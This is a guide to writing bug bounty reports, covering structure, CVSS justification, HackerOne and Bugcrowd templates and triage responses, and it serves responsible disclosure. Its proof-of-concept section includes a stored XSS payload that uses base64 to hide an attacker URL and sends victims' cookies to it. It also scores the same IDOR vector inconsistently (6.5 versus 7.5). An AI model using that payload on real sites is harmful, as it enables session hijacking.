# Bug Bounty Report Writing Guide

> Companion to `skills/security-bounty-hunter/SKILL.md`. This guide covers impact assessment, proof-of-concept formatting, severity justification, and platform-specific report templates that maximize acceptance rates and bounty payouts.

---

## 1. Report Structure Framework

A well-structured report is the difference between a quick triage and weeks in limbo. Every report should follow this skeleton:

```markdown
## Title
[Vulnerability Type] in [Component] allows [Impact] via [Vector]

## Severity
CVSS 3.1 Score: X.X (Critical/High/Medium/Low)
Vector: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

## Summary
One paragraph describing what the vulnerability is, where it exists,
and what an attacker can achieve by exploiting it.

## Steps to Reproduce
1. Navigate to...
2. Intercept the request...
3. Modify parameter X to...
4. Observe that...

## Impact
Describe real-world consequences: data exposure, account takeover,
financial loss, privilege escalation.

## Proof of Concept
[Screenshots, HTTP requests/responses, scripts]

## Remediation
Suggested fix with specific implementation guidance.

## References
- CWE-XXX: [Name]
- OWASP: [Category]
- Related CVEs or advisories
```

---

## 2. Impact Assessment and Severity Justification

Platforms pay based on impact, not cleverness. Frame every finding in terms of business impact:

```yaml
# Impact assessment framework
vulnerability: IDOR on /api/v2/users/{id}/documents
technical_impact:
  confidentiality: HIGH  # Access to all user documents
  integrity: LOW         # Read-only access
  availability: NONE     # No service disruption

business_impact:
  data_exposure: "All 2.3M user documents accessible"
  compliance: "GDPR Article 32 violation — personal data exposed"
  financial: "Potential regulatory fine up to 4% annual revenue"
  reputation: "User trust breach if disclosed publicly"

cvss_31:
  vector: "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
  score: 6.5
  severity: MEDIUM
  justification: |
    Network-accessible (AV:N), no special conditions (AC:L),
    requires low-privilege account (PR:L), no user interaction (UI:N),
    scope unchanged (S:U), high confidentiality impact (C:H).
```

---

## 3. Proof-of-Concept Formatting

PoCs must be reproducible by a triager who has never seen your bug before. Use raw HTTP requests:

```bash
# PoC: IDOR accessing another user's private documents
# Authenticated as user ID 1337, accessing user ID 1's documents

curl -s -X GET "https://target.com/api/v2/users/1/documents" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMzM3fQ.REDACTED" \
  -H "Content-Type: application/json" | jq '.documents[] | {id, title, created_at}'

# Expected: 403 Forbidden (user 1337 should not access user 1's docs)
# Actual: 200 OK with full document listing

# Response (truncated):
# {
#   "documents": [
#     {"id": 42, "title": "tax_return_2024.pdf", "created_at": "2024-01-15"},
#     {"id": 43, "title": "medical_records.pdf", "created_at": "2024-02-20"}
#   ],
#   "total": 847
# }
```

For XSS, provide a self-contained payload:

```bash
# PoC: Stored XSS in user profile bio field
# Step 1: Inject payload via profile update
curl -X PUT "https://target.com/api/users/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"bio": "<img src=x onerror=\"fetch(atob(`aHR0cHM6Ly9hdHRhY2tlci5jb20vc3RlYWw/Yz0=`)+document.cookie)\">"}'

# Step 2: Victim views attacker profile at /users/1337
# Result: Victim cookies exfiltrated to attacker server
# Impact: Full session hijack of any user viewing the profile
```

---

## 4. Platform-Specific Templates

### HackerOne Report Template

```markdown
## Summary
A [vulnerability type] vulnerability exists in [endpoint/feature] that allows
an attacker to [impact]. This affects [scope of affected users/data].

## Severity Justification
**CVSS 3.1**: X.X ([Vector String])
- Attack Vector: Network (remotely exploitable)
- Privileges Required: [None/Low/High]
- User Interaction: [None/Required]
- Impact: [Confidentiality/Integrity/Availability]

## Steps to Reproduce
1. Create account at https://target.com/signup
2. Navigate to [feature]
3. Using Burp Suite, intercept the request to [endpoint]
4. Modify [parameter] from [original] to [malicious]
5. Forward the request
6. Observe [evidence of exploitation]

## Supporting Material/References
- screenshot_1.png — Shows the vulnerable request
- screenshot_2.png — Shows unauthorized data in response
- poc.py — Automated exploitation script

## Impact
An attacker with [access level] can [specific action] affecting
[number/scope] of users. This could lead to [business consequence].
```

### Bugcrowd Submission Format

```markdown
**URL**: https://target.com/api/v2/admin/users
**Vulnerability Type**: Broken Access Control (P1)
**Browser/Environment**: curl 8.5.0 / Burp Suite 2024.1

**Description**:
The admin user listing endpoint lacks authorization checks. Any
authenticated user can access the full admin panel API by directly
requesting /api/v2/admin/* endpoints.

**PoC**:
[Numbered steps with curl commands and screenshots]

**Suggested Fix**:
Implement role-based access control middleware on all /api/v2/admin/*
routes. Verify the requesting user has admin role before processing.
```

---

## 5. Writing for Maximum Payout

Key principles that increase bounty amounts:

```yaml
# Report quality multipliers
high_payout_signals:
  - demonstrate_full_chain: "Show complete attack from initial access to impact"
  - quantify_affected_users: "This affects all 2.3M registered users"
  - show_data_sensitivity: "Exposes PII including SSN, medical records"
  - provide_remediation: "Specific code fix, not just 'validate input'"
  - chain_vulnerabilities: "IDOR + CSRF = account takeover without interaction"

low_payout_signals:
  - vague_impact: "This could potentially be dangerous"
  - missing_poc: "I believe this endpoint is vulnerable"
  - theoretical_only: "If an attacker could somehow..."
  - duplicate_indicators: "I found this using automated scanner X"
  - scope_confusion: "Found on staging.target.com (out of scope)"
```

---

## 6. Handling Triage Responses

When reports are questioned or downgraded, respond professionally with additional evidence:

```markdown
## Response to Triage Feedback

Thank you for the review. Regarding the concern that this requires
authentication:

**Clarification**: While the attack requires a valid session, the
authorization boundary being bypassed is between regular users and
admin functionality. Any of the 2.3M registered users can:

1. Register a free account (no approval needed)
2. Access admin-only endpoints using their regular session token
3. Export all user data including emails and hashed passwords

**Additional Evidence**:
- Attached: full_user_export.json (redacted) showing 50 records
  retrieved with a free-tier account
- The /api/v2/admin/export endpoint returns data paginated at 100
  records per request with no rate limiting

**Revised Impact**: Complete database exfiltration by any registered
user. This is not a theoretical risk — the attached export proves
full exploitation.
```

---

## 7. Automated Report Generation

Script repetitive report elements to maintain quality at scale:

```python
#!/usr/bin/env python3
"""Generate structured bug bounty report from findings data."""

from dataclasses import dataclass
from datetime import date

@dataclass(frozen=True)
class Finding:
    title: str
    vuln_type: str
    endpoint: str
    severity: str
    cvss_score: float
    cvss_vector: str
    impact: str
    steps: tuple[str, ...]
    remediation: str

def generate_report(finding: Finding) -> str:
    steps_formatted = "\n".join(
        f"{i+1}. {step}" for i, step in enumerate(finding.steps)
    )
    return f"""# {finding.title}

**Date**: {date.today().isoformat()}
**Severity**: {finding.severity} (CVSS {finding.cvss_score})
**Vector**: {finding.cvss_vector}
**Type**: {finding.vuln_type}
**Endpoint**: `{finding.endpoint}`

## Summary
{finding.title} — {finding.impact}

## Steps to Reproduce
{steps_formatted}

## Impact
{finding.impact}

## Remediation
{finding.remediation}
"""

# Example usage
finding = Finding(
    title="IDOR in Document API Exposes All User Files",
    vuln_type="Broken Access Control (CWE-639)",
    endpoint="/api/v2/users/{id}/documents",
    severity="HIGH",
    cvss_score=7.5,
    cvss_vector="AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    impact="Any authenticated user can access documents belonging to any other user",
    steps=(
        "Authenticate as user A (attacker account)",
        "Send GET /api/v2/users/1/documents with attacker's auth token",
        "Observe 200 response containing user 1's private documents",
        "Iterate user IDs to enumerate all documents in the system",
    ),
    remediation="Add authorization check: verify requesting user owns the resource"
)
print(generate_report(finding))
```

---

## 8. Common Rejection Reasons and Prevention

Avoid these report pitfalls that lead to "Informative" or "Not Applicable" closures:

```yaml
rejection_reasons:
  out_of_scope:
    prevention: "Always verify the asset is in scope before reporting"
    check: "grep -i 'scope' program_policy.txt"

  duplicate:
    prevention: "Search disclosed reports, check if obvious/well-known"
    check: "Search HackerOne Hacktivity for similar reports on same program"

  insufficient_impact:
    prevention: "Demonstrate real-world exploitation, not just theoretical"
    check: "Can I show actual data accessed or action performed?"

  not_reproducible:
    prevention: "Test PoC from clean environment before submitting"
    check: "Run PoC in incognito/fresh session without cached state"

  informational:
    prevention: "Ensure finding has security impact, not just bad practice"
    check: "What can an attacker DO with this? If nothing concrete, don't report"
```

Reports that demonstrate clear impact, provide reproducible PoCs, and frame findings in business terms consistently receive higher bounties and faster triage times.

---

## 9. Platform-Specific Report Guidelines

Different platforms have different triage processes and expectations. Tailoring your report format to the platform improves acceptance rates.

### HackerOne Report Best Practices

- Use the platform's built-in severity calculator for CVSS scoring
- Attach screenshots directly in the report (not external links)
- Include a 30-second video demonstration when possible
- Reference specific program policy sections when justifying severity
- HackerOne triagers handle 50+ reports daily; keep reports under 500 words for the initial submission

### Bugcrowd Report Best Practices

- Use Bugcrowd's Vulnerability Rating Taxonomy (VRT) for classification
- Map findings to the program's specific bounty table
- Include "Attack Scenario" section describing a realistic attack chain
- Bugcrowd triage is often faster; shorter reports work well

### Synack Report Best Practices

- Synack targets are higher-value; expect more thorough triage
- Include network diagrams when reporting complex vulnerabilities
- Document the full attack chain, not just the endpoint
- Synack requires "Clear, Actionable, Impactful" reports; all three elements are mandatory

---

## 10. Severity Negotiation Techniques

When a triager downgrades your finding, a professional response can often restore the original severity:

**Response template for severity downgrade:**

```markdown
Thank you for the triage. I'd like to respectfully discuss the severity
assessment. I believe this finding warrants [original severity] rather
than [downgraded severity] based on the following:

1. **Blast radius**: The vulnerability affects [X] users/records, not
   just the single account demonstrated in the PoC. I confirmed this by
   [describe additional testing].

2. **Attack simplicity**: The exploit requires no special tools or skills.
   A [describe attacker profile] could replicate this in under 5 minutes.

3. **Business impact**: Beyond the technical vulnerability, this exposes
   the organization to [regulatory/compliance/financial] risk because
   [specific reason].

4. **Program severity criteria**: Per the program's policy, [severity level]
   is defined as "[quote policy]". My finding matches this definition because
   [specific mapping].

Would you like me to provide additional evidence or a more comprehensive
impact demonstration?
```

---

## Hands-on Exercises

1. **Exercise 1**: Write a complete bounty report for a hypothetical SQL injection finding using the report structure framework. Include all sections: title, severity, summary, steps to reproduce, impact, PoC, and remediation. Aim for under 500 words while maintaining all critical information
2. **Exercise 2**: Take the same SQL injection finding and write it in three different styles: HackerOne format, Bugcrowd format, and a raw email to a vendor for responsible disclosure. Compare the differences in tone, structure, and level of detail
3. **Exercise 3**: Practice severity negotiation. Write a response to a triager who has downgraded your Critical finding to Medium. Include specific evidence, program policy references, and business impact arguments

---

## References

- HackerOne Hacktivity: https://hackerone.com/hacktivity
- Bugcrowd VRT: https://bugcrowd.com/vulnerability-rating-taxonomy
- OWASP Bug Bounty Guide: https://owasp.org/www-community/vulnerabilities/
- CVSS 3.1 Calculator: https://www.first.org/cvss/calculator/3.1
- CWE Database: https://cwe.mitre.org/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
